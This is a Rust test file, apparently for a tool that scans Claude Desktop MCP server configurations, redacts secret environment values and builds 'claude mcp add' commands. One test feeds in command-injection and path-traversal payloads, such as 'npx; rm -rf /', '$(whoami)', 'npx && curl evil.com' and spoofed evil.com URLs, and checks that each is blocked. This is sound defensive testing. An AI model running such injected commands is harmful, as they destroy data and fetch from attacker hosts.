use super::*;
use std::fs;

#[test]
fn parse_valid_servers_and_strips_env_secret_values() {
    let raw = r#"{
            "mcpServers": {
                "filesystem": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user/projects"],
                    "env": {
                        "ANTHROPIC_API_KEY": "sk-ant-super-secret-value-12345",
                        "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_ultraSecretToken999"
                    }
                },
                "local_http": {
                    "url": "http://127.0.0.1:8787/mcp"
                },
                "remote_https": {
                    "url": "https://mcp.example.com/v1/sse"
                }
            }
        }"#;

    let exts = parse_claude_desktop_config(raw).unwrap_or_default();
    assert_eq!(exts.len(), 3);

    let fs_ext = exts.iter().find(|e| e.name == "filesystem");
    assert!(fs_ext.is_some());
    if let Some(fs_ext) = fs_ext {
        assert_eq!(fs_ext.kind, DiscoveredKind::McpStdio);
        assert_eq!(fs_ext.command_or_url, "npx");
        assert_eq!(
            fs_ext.args,
            vec![
                "-y".to_string(),
                "@modelcontextprotocol/server-filesystem".to_string(),
                "/home/user/projects".to_string()
            ]
        );
        assert_eq!(fs_ext.verdict, SecurityVerdict::SafeToReview);
        assert!(fs_ext.env_keys.contains(&"ANTHROPIC_API_KEY".to_string()));
        assert!(fs_ext
            .env_keys
            .contains(&"GITHUB_PERSONAL_ACCESS_TOKEN".to_string()));

        let debug_repr = format!("{fs_ext:?}");
        assert!(!debug_repr.contains("sk-ant-super-secret-value-12345"));
        assert!(!debug_repr.contains("ghp_ultraSecretToken999"));
    }

    let local_ext = exts.iter().find(|e| e.name == "local_http");
    assert!(local_ext.is_some());
    if let Some(local_ext) = local_ext {
        assert_eq!(local_ext.kind, DiscoveredKind::McpHttp);
        assert_eq!(local_ext.verdict, SecurityVerdict::SafeToReview);
    }

    let remote_ext = exts.iter().find(|e| e.name == "remote_https");
    assert!(remote_ext.is_some());
    if let Some(remote_ext) = remote_ext {
        assert_eq!(remote_ext.kind, DiscoveredKind::McpHttp);
        assert_eq!(remote_ext.verdict, SecurityVerdict::SafeToReview);
    }
}

#[test]
fn blocks_shell_injection_path_traversal_and_insecure_urls() {
    let raw = r#"{
            "mcpServers": {
                "inj_semicolon": {
                    "command": "npx; rm -rf /",
                    "args": []
                },
                "inj_subshell": {
                    "command": "node",
                    "args": ["$(whoami).js"]
                },
                "inj_backtick": {
                    "command": "node `id`",
                    "args": []
                },
                "inj_pipe": {
                    "command": "npx | sh",
                    "args": []
                },
                "inj_and": {
                    "command": "npx && curl evil.com",
                    "args": []
                },
                "traversal_cmd": {
                    "command": "/usr/local/bin/../../bin/sh",
                    "args": []
                },
                "traversal_arg": {
                    "command": "node",
                    "args": ["../secrets/server.js"]
                },
                "insecure_http": {
                    "url": "http://evil.example.com/mcp"
                },
                "spoofed_localhost": {
                    "url": "http://localhost.evil.com/mcp"
                }
            }
        }"#;

    let exts = parse_claude_desktop_config(raw).unwrap_or_default();
    assert_eq!(exts.len(), 9);

    for ext in &exts {
        assert!(
            matches!(ext.verdict, SecurityVerdict::Blocked(_)),
            "esperava que '{}' fosse bloqueado, mas recebeu {:?}",
            ext.name,
            ext.verdict
        );
    }
}

#[test]
fn generates_claude_mcp_add_only_for_safe_stdio_or_http() {
    let safe_stdio = DiscoveredExtension {
        name: "my-server".to_string(),
        kind: DiscoveredKind::McpStdio,
        command_or_url: "npx".to_string(),
        args: vec![
            "-y".to_string(),
            "@scope/pkg".to_string(),
            "it's-quoted".to_string(),
        ],
        env_keys: vec!["API_KEY".to_string()],
        verdict: SecurityVerdict::SafeToReview,
    };
    let cmd = approved_claude_mcp_add_command(&safe_stdio);
    assert_eq!(
        cmd,
        Ok("claude mcp add 'my-server' -- 'npx' '-y' '@scope/pkg' 'it'\\''s-quoted'".to_string())
    );

    let safe_http = DiscoveredExtension {
        name: "local-sse".to_string(),
        kind: DiscoveredKind::McpHttp,
        command_or_url: "http://localhost:3000/mcp".to_string(),
        args: Vec::new(),
        env_keys: Vec::new(),
        verdict: SecurityVerdict::SafeToReview,
    };
    let http_cmd = approved_claude_mcp_add_command(&safe_http);
    assert_eq!(
        http_cmd,
        Ok("claude mcp add --transport http 'local-sse' 'http://localhost:3000/mcp'".to_string())
    );

    let bundle = DiscoveredExtension {
        name: "extension-pack".to_string(),
        kind: DiscoveredKind::DesktopBundle,
        command_or_url: "/home/user/.config/Claude/extensions/extension-pack.mcpb".to_string(),
        args: Vec::new(),
        env_keys: Vec::new(),
        verdict: SecurityVerdict::SafeToReview,
    };
    assert!(approved_claude_mcp_add_command(&bundle).is_err());

    let blocked = DiscoveredExtension {
        name: "bad-server".to_string(),
        kind: DiscoveredKind::McpStdio,
        command_or_url: "npx; id".to_string(),
        args: Vec::new(),
        env_keys: Vec::new(),
        verdict: SecurityVerdict::Blocked("metacaractere".to_string()),
    };
    assert!(approved_claude_mcp_add_command(&blocked).is_err());
}

#[test]
fn scan_home_discovers_configs_and_desktop_bundles_readonly() {
    let temp = tempfile::tempdir();
    assert!(temp.is_ok());
    let Ok(temp) = temp else {
        return;
    };
    let home = temp.path();

    let config_dir = home.join(".config/Claude");
    let ext_dir = config_dir.join("extensions");
    assert!(fs::create_dir_all(&ext_dir).is_ok());

    let config_json = r#"{
            "mcpServers": {
                "sqlite": {
                    "command": "uvx",
                    "args": ["mcp-server-sqlite", "--db-path", "/tmp/test.db"],
                    "env": { "SECRET_TOKEN": "do-not-leak" }
                }
            }
        }"#;
    assert!(fs::write(config_dir.join("claude_desktop_config.json"), config_json).is_ok());
    assert!(fs::write(ext_dir.join("slack-tools.mcpb"), b"bundle-bytes").is_ok());
    assert!(fs::write(ext_dir.join("custom-agent.dxt"), b"dxt-bytes").is_ok());
    assert!(fs::write(ext_dir.join("ignored.txt"), b"ignore").is_ok());

    let discovered = scan_home(home);
    assert_eq!(discovered.len(), 3);

    assert!(discovered
        .iter()
        .any(|d| d.name == "sqlite" && d.kind == DiscoveredKind::McpStdio));
    assert!(discovered
        .iter()
        .any(|d| d.name == "slack-tools" && d.kind == DiscoveredKind::DesktopBundle));
    assert!(discovered
        .iter()
        .any(|d| d.name == "custom-agent" && d.kind == DiscoveredKind::DesktopBundle));
}
